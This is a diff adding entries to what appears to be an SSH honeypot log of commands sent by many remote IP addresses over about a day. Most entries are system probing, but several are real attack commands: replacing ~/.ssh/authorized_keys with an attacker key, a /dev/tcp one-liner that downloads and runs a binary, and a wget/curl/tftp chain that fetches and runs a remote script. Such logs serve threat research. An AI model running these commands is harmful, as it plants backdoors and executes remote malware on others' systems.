@@ -22057,3 +22057,388 @@
 2025-05-04 23:41:44 from 23.95.229.171: lscpu
 2025-05-04 23:57:48 from 196.250.208.207: cd ~; chattr -ia .ssh; lockr -ia .ssh
 2025-05-04 23:57:50 from 196.250.208.207: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+2025-05-05 00:00:51 from 49.162.227.188: cd ~; chattr -ia .ssh; lockr -ia .ssh
+2025-05-05 00:00:51 from 49.162.227.188: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+2025-05-05 00:29:39 from 103.172.154.255: cd ~; chattr -ia .ssh; lockr -ia .ssh
+2025-05-05 00:29:39 from 103.172.154.255: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+2025-05-05 01:21:32 from 23.95.229.171: lscpu
+2025-05-05 01:21:34 from 23.95.229.171: lscpu
+2025-05-05 01:21:35 from 23.95.229.171: lscpu
+2025-05-05 01:24:05 from 115.190.39.222: uname -s -m
+2025-05-05 01:28:29 from 20.39.195.9: (uname -smr || /bin/uname -smr || /usr/bin/uname -smr)
+2025-05-05 01:28:29 from 20.39.195.9: uname -smr || /bin/uname -smr || /usr/bin/uname -smr
+2025-05-05 01:36:28 from 103.174.114.24: cd ~; chattr -ia .ssh; lockr -ia .ssh
+2025-05-05 01:36:28 from 103.174.114.24: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+2025-05-05 02:04:17 from 186.233.208.13: cd ~; chattr -ia .ssh; lockr -ia .ssh
+2025-05-05 02:04:18 from 186.233.208.13: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+2025-05-05 02:13:40 from 5.157.10.83: cd ~; chattr -ia .ssh; lockr -ia .ssh
+2025-05-05 02:13:40 from 5.157.10.83: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+2025-05-05 02:46:50 from 115.28.242.66: cat /bin/echo
+2025-05-05 02:47:11 from 115.28.242.66: nohup bash -c "exec 6<>/dev/tcp/47.242.46.55/60127 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/Atxmj8JtVp && chmod +x /tmp/Atxmj8JtVp && /tmp/Atxmj8JtVp O9KqTtPPLjNFLkA/L8/YSqHESkvCrFzb1ycpQDFIKS7W2VKvykBMwqpI2MEnKUMxRikt1NpSo8BATMKqSNLBKzBfMkU1MdXcUq7HQEzCqk7dwS42RC5DPzHT3k61xExAxKtN2Ng/M0YuQzMtz95KtcdPQMSrTdjWXjPETOQvBhSSFuMTGc4OMF/BJEVW" &
+2025-05-05 02:47:11 from 115.28.242.66: head -c 1458464 > /tmp/wfOgx7TQgx
+2025-05-05 02:47:11 from 115.28.242.66: cat /bin/echoQtd#UPX!
+2025-05-05 02:47:11 from 115.28.242.66: >yoA@/;'8ELFP;i2
+2025-05-05 02:47:11 from 115.28.242.66: 
+2025-05-05 02:54:09 from 103.118.28.110: uname -a
+2025-05-05 03:01:42 from 23.95.229.171: lscpu
+2025-05-05 03:01:44 from 23.95.229.171: lscpu
+2025-05-05 03:01:45 from 23.95.229.171: lscpu
+2025-05-05 03:36:28 from 37.156.155.54: uname -a
+2025-05-05 04:40:30 from 23.95.229.171: lscpu
+2025-05-05 04:40:32 from 23.95.229.171: lscpu
+2025-05-05 04:40:34 from 23.95.229.171: lscpu
+2025-05-05 05:37:06 from 101.126.92.215: cd ~; chattr -ia .ssh; lockr -ia .ssh
+2025-05-05 05:37:08 from 101.126.92.215: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+2025-05-05 05:45:17 from 35.222.117.243: cd ~; chattr -ia .ssh; lockr -ia .ssh
+2025-05-05 05:45:18 from 35.222.117.243: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+2025-05-05 05:52:12 from 106.57.253.254: uname -s -m
+2025-05-05 06:20:49 from 23.95.229.171: lscpu
+2025-05-05 06:20:51 from 23.95.229.171: lscpu
+2025-05-05 06:20:53 from 23.95.229.171: lscpu
+2025-05-05 06:54:25 from 159.65.125.111: uname -s -v -n -r -m
+2025-05-05 07:31:16 from 128.199.14.230: cd ~; chattr -ia .ssh; lockr -ia .ssh
+2025-05-05 07:31:16 from 128.199.14.230: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+2025-05-05 07:36:47 from 93.48.24.181: cd ~; chattr -ia .ssh; lockr -ia .ssh
+2025-05-05 07:36:48 from 93.48.24.181: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+2025-05-05 07:42:14 from 176.109.92.170: cd ~; chattr -ia .ssh; lockr -ia .ssh
+2025-05-05 07:42:15 from 176.109.92.170: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+2025-05-05 07:54:17 from 1.13.5.88: cd ~; chattr -ia .ssh; lockr -ia .ssh
+2025-05-05 07:54:18 from 1.13.5.88: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+2025-05-05 08:01:01 from 23.95.229.171: lscpu
+2025-05-05 08:01:03 from 23.95.229.171: lscpu
+2025-05-05 08:01:04 from 23.95.229.171: lscpu
+2025-05-05 08:03:59 from 128.199.14.230: cd ~; chattr -ia .ssh; lockr -ia .ssh
+2025-05-05 08:04:00 from 128.199.14.230: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+2025-05-05 08:19:47 from 1.13.5.88: cd ~; chattr -ia .ssh; lockr -ia .ssh
+2025-05-05 08:19:48 from 1.13.5.88: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+2025-05-05 08:38:06 from 134.199.158.184: uname -s -v -n -r -m
+2025-05-05 08:40:10 from 134.199.158.184: uname -s -v -n -r -m
+2025-05-05 08:41:54 from 134.199.158.184: uname -s -v -n -r -m
+2025-05-05 08:43:02 from 134.199.158.184: uname -s -v -n -r -m
+2025-05-05 08:43:29 from 134.199.158.184: uname -s -v -n -r -m
+2025-05-05 08:44:47 from 134.199.158.184: uname -s -v -n -r -m
+2025-05-05 08:45:36 from 134.199.158.184: uname -s -v -n -r -m
+2025-05-05 08:46:03 from 134.199.158.184: uname -s -v -n -r -m
+2025-05-05 08:46:40 from 134.199.158.184: uname -s -v -n -r -m
+2025-05-05 08:49:00 from 134.199.158.184: uname -s -v -n -r -m
+2025-05-05 08:50:35 from 134.199.158.184: uname -s -v -n -r -m
+2025-05-05 08:50:40 from 134.199.158.184: uname -s -v -n -r -m
+2025-05-05 08:51:16 from 134.199.158.184: uname -s -v -n -r -m
+2025-05-05 08:52:10 from 134.199.158.184: uname -s -v -n -r -m
+2025-05-05 08:52:28 from 134.199.158.184: uname -s -v -n -r -m
+2025-05-05 08:52:55 from 134.199.158.184: uname -s -v -n -r -m
+2025-05-05 08:53:27 from 134.199.158.184: uname -s -v -n -r -m
+2025-05-05 08:53:31 from 134.199.158.184: uname -s -v -n -r -m
+2025-05-05 08:54:07 from 134.199.158.184: uname -s -v -n -r -m
+2025-05-05 08:54:12 from 134.199.158.184: uname -s -v -n -r -m
+2025-05-05 08:55:06 from 134.199.158.184: uname -s -v -n -r -m
+2025-05-05 08:58:23 from 1.13.5.88: cd ~; chattr -ia .ssh; lockr -ia .ssh
+2025-05-05 08:58:24 from 1.13.5.88: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+2025-05-05 09:06:49 from 159.65.125.111: uname -s -v -n -r -m
+2025-05-05 09:23:18 from 159.65.125.111: uname -s -v -n -r -m
+2025-05-05 09:39:25 from 45.61.161.218: uname -s -v -n -r -m
+2025-05-05 09:39:27 from 45.61.161.218: uname -s -v -n -r -m
+2025-05-05 09:39:37 from 45.61.161.218: uname -s -v -n -r -m
+2025-05-05 09:39:46 from 45.61.161.218: uname -s -v -n -r -m
+2025-05-05 09:40:42 from 45.61.161.218: uname -s -v -n -r -m
+2025-05-05 09:40:52 from 45.61.161.218: uname -s -v -n -r -m
+2025-05-05 09:40:56 from 23.95.229.171: lscpu
+2025-05-05 09:40:58 from 23.95.229.171: lscpu
+2025-05-05 09:40:59 from 45.61.161.218: uname -s -v -n -r -m
+2025-05-05 09:41:00 from 23.95.229.171: lscpu
+2025-05-05 09:41:09 from 45.61.161.218: uname -s -v -n -r -m
+2025-05-05 09:41:35 from 45.61.161.218: uname -s -v -n -r -m
+2025-05-05 09:41:41 from 45.61.161.218: uname -s -v -n -r -m
+2025-05-05 09:41:47 from 45.61.161.218: uname -s -v -n -r -m
+2025-05-05 09:41:50 from 45.61.161.218: uname -s -v -n -r -m
+2025-05-05 09:41:58 from 45.61.161.218: uname -s -v -n -r -m
+2025-05-05 09:42:25 from 45.61.161.218: uname -s -v -n -r -m
+2025-05-05 09:42:35 from 45.61.161.218: uname -s -v -n -r -m
+2025-05-05 09:42:53 from 45.61.161.218: uname -s -v -n -r -m
+2025-05-05 09:42:55 from 45.61.161.218: uname -s -v -n -r -m
+2025-05-05 09:43:00 from 45.61.161.218: uname -s -v -n -r -m
+2025-05-05 09:43:03 from 45.61.161.218: uname -s -v -n -r -m
+2025-05-05 09:43:11 from 45.61.161.218: uname -s -v -n -r -m
+2025-05-05 09:43:18 from 45.61.161.218: uname -s -v -n -r -m
+2025-05-05 09:43:21 from 45.61.161.218: uname -s -v -n -r -m
+2025-05-05 09:43:30 from 45.61.161.218: uname -s -v -n -r -m
+2025-05-05 09:43:57 from 45.61.161.218: uname -s -v -n -r -m
+2025-05-05 09:43:58 from 45.61.161.218: uname -s -v -n -r -m
+2025-05-05 09:44:14 from 45.61.161.218: uname -s -v -n -r -m
+2025-05-05 09:44:45 from 45.61.161.218: uname -s -v -n -r -m
+2025-05-05 09:45:06 from 45.61.161.218: uname -s -v -n -r -m
+2025-05-05 09:45:22 from 45.61.161.218: uname -s -v -n -r -m
+2025-05-05 09:45:27 from 45.61.161.218: uname -s -v -n -r -m
+2025-05-05 09:45:27 from 45.61.161.218: uname -s -v -n -r -m
+2025-05-05 11:22:44 from 23.95.229.171: lscpu
+2025-05-05 11:22:46 from 23.95.229.171: lscpu
+2025-05-05 11:22:48 from 23.95.229.171: lscpu
+2025-05-05 12:08:26 from 154.221.29.8: cd ~; chattr -ia .ssh; lockr -ia .ssh
+2025-05-05 12:08:26 from 154.221.29.8: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+2025-05-05 12:33:51 from 176.65.148.10: cd /tmp; rm -rf wget.sh curl.sh; wget http://213.209.143.44/ssh.sh; chmod +x ssh.sh; sh ssh.sh;curl -o http://213.209.143.44/ssh.sh; chmod +x ssh.sh; sh ssh.sh; tftp -r ssh.sh -g 213.209.143.44; chmod 777 ssh.sh; sh ssh.sh
+2025-05-05 12:34:24 from 176.65.148.10: cd /tmp; rm -rf wget.sh curl.sh; wget http://213.209.143.44/ssh.sh; chmod +x ssh.sh; sh ssh.sh;curl -o http://213.209.143.44/ssh.sh; chmod +x ssh.sh; sh ssh.sh; tftp -r ssh.sh -g 213.209.143.44; chmod 777 ssh.sh; sh ssh.sh
+2025-05-05 12:34:42 from 103.243.25.96: uname -s -v -n -r -m
+2025-05-05 12:35:15 from 176.65.148.10: cd /tmp; rm -rf wget.sh curl.sh; wget http://213.209.143.44/ssh.sh; chmod +x ssh.sh; sh ssh.sh;curl -o http://213.209.143.44/ssh.sh; chmod +x ssh.sh; sh ssh.sh; tftp -r ssh.sh -g 213.209.143.44; chmod 777 ssh.sh; sh ssh.sh
+2025-05-05 12:35:16 from 176.65.148.10: cd /tmp; rm -rf wget.sh curl.sh; wget http://213.209.143.44/ssh.sh; chmod +x ssh.sh; sh ssh.sh;curl -o http://213.209.143.44/ssh.sh; chmod +x ssh.sh; sh ssh.sh; tftp -r ssh.sh -g 213.209.143.44; chmod 777 ssh.sh; sh ssh.sh
+2025-05-05 12:35:16 from 176.65.148.10: cd /tmp; rm -rf wget.sh curl.sh; wget http://213.209.143.44/ssh.sh; chmod +x ssh.sh; sh ssh.sh;curl -o http://213.209.143.44/ssh.sh; chmod +x ssh.sh; sh ssh.sh; tftp -r ssh.sh -g 213.209.143.44; chmod 777 ssh.sh; sh ssh.sh
+2025-05-05 12:37:26 from 103.243.25.96: uname -s -v -n -r -m
+2025-05-05 12:37:30 from 103.243.25.96: uname -s -v -n -r -m
+2025-05-05 12:37:30 from 103.243.25.96: uname -s -v -n -r -m
+2025-05-05 12:38:13 from 103.243.25.96: uname -s -v -n -r -m
+2025-05-05 12:38:27 from 103.243.25.96: uname -s -v -n -r -m
+2025-05-05 12:39:00 from 103.243.25.96: uname -s -v -n -r -m
+2025-05-05 12:40:08 from 103.243.25.96: uname -s -v -n -r -m
+2025-05-05 12:40:28 from 103.243.25.96: uname -s -v -n -r -m
+2025-05-05 12:41:20 from 103.243.25.96: uname -s -v -n -r -m
+2025-05-05 12:41:26 from 103.243.25.96: uname -s -v -n -r -m
+2025-05-05 12:41:30 from 103.243.25.96: uname -s -v -n -r -m
+2025-05-05 12:41:37 from 103.243.25.96: uname -s -v -n -r -m
+2025-05-05 12:42:34 from 103.243.25.96: uname -s -v -n -r -m
+2025-05-05 12:42:35 from 103.243.25.96: uname -s -v -n -r -m
+2025-05-05 12:43:42 from 103.243.25.96: uname -s -v -n -r -m
+2025-05-05 12:43:45 from 103.243.25.96: uname -s -v -n -r -m
+2025-05-05 12:44:06 from 103.243.25.96: uname -s -v -n -r -m
+2025-05-05 12:45:43 from 103.243.25.96: uname -s -v -n -r -m
+2025-05-05 12:46:46 from 103.243.25.96: uname -s -v -n -r -m
+2025-05-05 12:46:53 from 103.243.25.96: uname -s -v -n -r -m
+2025-05-05 12:47:07 from 103.243.25.96: uname -s -v -n -r -m
+2025-05-05 12:47:20 from 103.243.25.96: uname -s -v -n -r -m
+2025-05-05 13:02:24 from 23.95.229.171: lscpu
+2025-05-05 13:02:26 from 23.95.229.171: lscpu
+2025-05-05 13:02:28 from 23.95.229.171: lscpu
+2025-05-05 13:50:12 from 103.7.43.176: uname -s -v -n -r -m
+2025-05-05 13:50:12 from 103.7.43.176: uname -s -v -n -r -m
+2025-05-05 13:50:19 from 103.7.43.176: uname -s -v -n -r -m
+2025-05-05 13:50:28 from 103.7.43.176: uname -s -v -n -r -m
+2025-05-05 13:51:15 from 103.7.43.176: uname -s -v -n -r -m
+2025-05-05 13:51:26 from 103.7.43.176: uname -s -v -n -r -m
+2025-05-05 13:51:36 from 103.7.43.176: uname -s -v -n -r -m
+2025-05-05 13:51:43 from 103.7.43.176: uname -s -v -n -r -m
+2025-05-05 13:52:06 from 103.7.43.176: uname -s -v -n -r -m
+2025-05-05 13:52:14 from 103.7.43.176: uname -s -v -n -r -m
+2025-05-05 13:52:25 from 103.7.43.176: uname -s -v -n -r -m
+2025-05-05 13:52:32 from 103.7.43.176: uname -s -v -n -r -m
+2025-05-05 13:52:36 from 103.7.43.176: uname -s -v -n -r -m
+2025-05-05 13:52:52 from 103.7.43.176: uname -s -v -n -r -m
+2025-05-05 13:53:09 from 103.7.43.176: uname -s -v -n -r -m
+2025-05-05 13:53:28 from 103.7.43.176: uname -s -v -n -r -m
+2025-05-05 13:53:32 from 103.7.43.176: uname -s -v -n -r -m
+2025-05-05 13:53:34 from 103.7.43.176: uname -s -v -n -r -m
+2025-05-05 13:53:42 from 103.7.43.176: uname -s -v -n -r -m
+2025-05-05 13:53:48 from 103.7.43.176: uname -s -v -n -r -m
+2025-05-05 13:53:51 from 103.7.43.176: uname -s -v -n -r -m
+2025-05-05 13:53:57 from 103.7.43.176: uname -s -v -n -r -m
+2025-05-05 13:54:11 from 103.7.43.176: uname -s -v -n -r -m
+2025-05-05 13:54:37 from 103.7.43.176: uname -s -v -n -r -m
+2025-05-05 13:54:41 from 103.7.43.176: uname -s -v -n -r -m
+2025-05-05 13:55:12 from 103.7.43.176: uname -s -v -n -r -m
+2025-05-05 13:55:25 from 103.7.43.176: uname -s -v -n -r -m
+2025-05-05 13:55:38 from 103.7.43.176: uname -s -v -n -r -m
+2025-05-05 13:55:47 from 103.7.43.176: uname -s -v -n -r -m
+2025-05-05 13:55:48 from 103.7.43.176: uname -s -v -n -r -m
+2025-05-05 14:06:46 from 36.138.156.96: uname -s -m
+2025-05-05 14:11:07 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 14:16:42 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 14:21:42 from 164.92.191.219: uname -s -v -n -r -m
+2025-05-05 14:25:40 from 212.159.71.187: cd ~; chattr -ia .ssh; lockr -ia .ssh
